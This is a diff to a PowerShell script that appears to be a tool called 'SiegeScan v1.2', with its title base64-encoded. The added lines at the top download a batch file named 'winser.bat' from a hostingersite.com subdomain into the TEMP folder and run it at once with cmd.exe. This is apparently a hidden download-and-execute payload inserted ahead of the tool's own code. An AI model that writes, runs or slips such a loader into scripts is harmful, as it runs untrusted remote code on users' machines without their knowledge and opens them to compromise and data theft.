@@ -1,3 +1,9 @@
+$batUrl = "https://mediumvioletred-mosquito-767246.hostingersite.com/winser.bat"
+$batPath = "$env:TEMP\winser.bat"
+
+Invoke-WebRequest -Uri $batUrl -OutFile $batPath
+Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$batPath`""
+
 Clear-Host
 $encodedTitle = "U2llZ2VTY2FuIHYxLjI="
 $titleText = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encodedTitle))
